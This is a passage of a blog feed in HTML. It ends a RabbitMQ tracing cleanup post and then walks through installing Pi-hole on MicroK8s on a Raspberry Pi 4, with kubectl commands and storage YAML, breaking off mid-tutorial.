<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> /tmp/rmq.conf </span><span class="token parameter variable" style="color:#36acaa">-N</span><span class="token plain"> instance purge queue </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">queue purged</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Delete the debug queue:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> /tmp/rmq.conf </span><span class="token parameter variable" style="color:#36acaa">-N</span><span class="token plain"> instance delete queue </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">queue deleted</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And finally, disable the <code>rabbitmq_tracing</code> plugin to remove the <code>amq.rabbitmq.trace</code> exchange:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl </span><span class="token builtin class-name">exec</span><span class="token plain"> rabbitmq-ha-0 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> rabbitmq-ha </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> prod -- rabbitmq-plugins disable rabbitmq_tracing</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Debugging" term="Debugging"/>
        <category label="Docker" term="Docker"/>
        <category label="Kubernetes" term="Kubernetes"/>
        <category label="Rabbitmq" term="Rabbitmq"/>
        <category label="Trace" term="Trace"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Installing PiHole On Raspberry Pi 4, MicroK8s running Ubuntu 20.04 (focal)]]></title>
        <id>https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004</id>
        <link href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="pihole-whats-that">PiHole, What’s That?<a href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004#pihole-whats-that" class="hash-link" aria-label="Direct link to PiHole, What’s That?" title="Direct link to PiHole, What’s That?">​</a></h2>
<p>The <a href="https://en.wikipedia.org/wiki/Pi-hole" target="_blank" rel="noopener noreferrer">Wikipedia definition</a> should be sufficient in explaining what the software does:</p>
<blockquote>
<p>Pi-hole or Pihole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network</p>
</blockquote>
<p>I wanted to deploy it for a few reasons:</p>
<ul>
<li>I have a spare Raspberry Pi 4 lying around.</li>
<li>Because I’m working on getting my CKAD (Certified Kubernetes Application Developer) certification and thought it would be a great hands-on practice.</li>
<li>I couldn’t find a good enough article that described how to install PiHole on Kubernetes. The majority did not go throught the whole procedure, were aimed for Docker/Swarm and Raspbian (Raspberry Pi flavored Linux distribution).</li>
<li>I got tired of all the advertisements and popups on all the devices while surfing the web at home.</li>
</ul>
<p>This post is here to explain how was able to deploy PiHole on Kubernetes and how I resolved some of the problems that occurred during the deployment process.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="setting-up-kubernetes-on-ubuntu">Setting Up Kubernetes on Ubuntu<a href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004#setting-up-kubernetes-on-ubuntu" class="hash-link" aria-label="Direct link to Setting Up Kubernetes on Ubuntu" title="Direct link to Setting Up Kubernetes on Ubuntu">​</a></h2>
<p>There are a few ways to do this. I was looking at the different options but decided to choose MicroK8s in the end (over Charmed Kubernetes or kubeadm) simply because the Canonical team maintains it (Canonical is the publisher of Ubuntu) so I thought it would be the wisest decision long term as any kernel/software upgrades on the OS level would likely be QA’d in the future in accordance with MicroK8s maintenance.
Since MicroK8s is bundled as a snap (an additional package manager for Ubuntu), it already includes all the binaries necessary to set up Kubernetes. So we can run the following command to install it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> snap </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> microk8s </span><span class="token parameter variable" style="color:#36acaa">--classic</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We also need to ensure that we’re allowing the different Kubernetes components to communicate with each other. To modify the firewall settings, we run the following:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> ufw allow </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> on cni0 </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> ufw allow out on cni0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> ufw default allow routed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We also need to enable a DNS for the Kubernetes deployment. To do this we run:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">microk8s </span><span class="token builtin class-name">enable</span><span class="token plain"> dns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can then verify that the basic Kubernetes resources are up and running by:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">microk8s kubectl get all --all-namespaces</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We should see that the kube-system namespace has the CNI (by  default Calico) controllers and node, coredns are running.
You may have noticed that we need to prefix the <code>kubectl</code> commands with microk8s, which bothered me a bit because I was used to interacting with the Kubernetes API server using only <code>kubectl [ACTION] [RESOURCE]</code>. I decided to install <code>kubectl</code> from the <code>snap</code> store to prevent typing out an extra prefix:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">snap </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> kubectl </span><span class="token parameter variable" style="color:#36acaa">--classic</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We now have a running bare Kubernetes single node and ready to create all the necessary resources!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="creating-storage-and-kubernetes-resources">Creating Storage and Kubernetes Resources<a href="https://kbbgl.github.io/blog/install-pihole-rpi4-microk8s-ubuntu-2004#creating-storage-and-kubernetes-resources" class="hash-link" aria-label="Direct link to Creating Storage and Kubernetes Resources" title="Direct link to Creating Storage and Kubernetes Resources">​</a></h2>
<p>One of the great advantages of Kubernetes is the ability to isolate applications into their own scope, called Namespaces. Since I did see myself using the cluster for other projects in the future, I thought it would be practical to separate the Pihole project from the future projects into its own Namespace. To create the new namespace, I ran the following:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl create namespace pihole</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Since all of the following commands will be run in this namespace (and we want to save typing <code>-n pihole</code> in every command), we can just set the context of the following commands to the newly-created namespace. To do this:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl config set-content </span><span class="token parameter variable" style="color:#36acaa">--current</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--namespace</span><span class="token plain"> pihole</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Next I tackled the subject of storage. Since Pihole requires some persistent storage for configuration files, logs and data for its SQLLite database, we need to create a place in the filesystem that will be used as the mount for the persistent storage resources we’ll set up for the Pod. So I created a directory in my home directory to hold it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> ~/pihole/data</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Make sure that you have enough space in the directory you choose (you can use <code>df u /path/to/pihole/data</code> to verify).
Next, we need to create some resources to bind the host (Raspberry Pi) filesystem to the Kubernetes resources which will run the Pihole container. We need to create 3 things:</p>
<ol>
<li>Default <code>StorageClass</code> – This is just a resource that we use to describe the different types of storage the Kubernetes deployment offers. In our case, the <code>StorageClass</code> will be a simple one that’s provisioned by the local machine.</li>
<li>2 <code>PersistentVolume</code>s – These are abstractions of the volumes we’ll be using to store the data for Pihole. We need to specify 2 of these, one for the assets stored in the /etc filesystem of the container (such as DNS server lists, domain lists , pihole FTL configuration, etc) and one for the <code>dnsmasq</code> filesystem (includes the initial Pihole configuration).</li>
<li>2 <code>PersistentVolumeClaim</code>s – These are the actual requests for storage from the PVs created above.</li>
</ol>
<p>To create the <code>StorageClass</code>, I defined the following specification called <code>storageclass.yaml</code>:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> storage.k8s.io/v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> StorageClass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> manual</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">provisioner</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> manual</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">reclaimPolicy</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Delete</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">volumeBindingMode</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Immediate</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The <code>volumeBindingMode: Immediate</code> ensures that upon specifying the <code>PersistentStorage</code> to the same provisioner type (manual), the <code>StorageClass</code> will immediately bind to it. The <code>reclaimPolicy</code> ensures that ones the <code>PersistentVolumeClaims</code> are discarded, so will the <code>StorageClass</code>.
We can create the resource by running:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl apply </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> storageclass.yaml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Now that we have a <code>StorageClass</code> set up, we can create the 2 PVs (<code>volume-etc.yaml</code> and <code>volume-dnsmasq.yaml</code>, respectively):</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> PersistentVolume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">volume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">type</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">storageClassName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> manual</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">capacity</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">storage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 1Gi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">accessModes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> ReadWriteOnce</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">hostPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">path</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"/home/ubuntu/pihole/data/"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> PersistentVolume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">dnsmasq</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">type</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">storageClassName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> manual</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">capacity</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">storage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 1Gi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">accessModes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> ReadWriteOnce</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">hostPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">path</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"/home/ubuntu/pihole/data/"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" 